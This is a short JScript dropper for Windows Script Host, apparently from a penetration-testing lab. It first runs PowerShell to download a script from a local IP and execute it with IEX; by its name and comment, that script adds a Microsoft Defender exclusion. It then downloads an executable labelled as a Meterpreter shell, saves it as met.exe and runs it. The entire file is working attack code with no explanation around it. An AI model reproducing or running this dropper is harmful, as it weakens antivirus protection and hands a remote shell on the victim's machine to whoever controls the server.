// execute exclusion
new ActiveXObject("WScript.Shell").Run("powershell \"(new-object system.net.webclient).downloadstring('http://192.168.109.44:8082/add-defender-exclusion.ps1') | IEX\"");

// download meterpreter shell
var url = "http://192.168.109.44:8082/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
	var Stream = WScript.CreateObject('ADODB.Stream');

	Stream.Open();
	Stream.Type = 1;
	Stream.Write(Object.ResponseBody);
	Stream.Position = 0;

	Stream.SaveToFile("met.exe", 2);
	Stream.Close();

	// run shell
	var r = new ActiveXObject("WScript.Shell").Run("met.exe");
}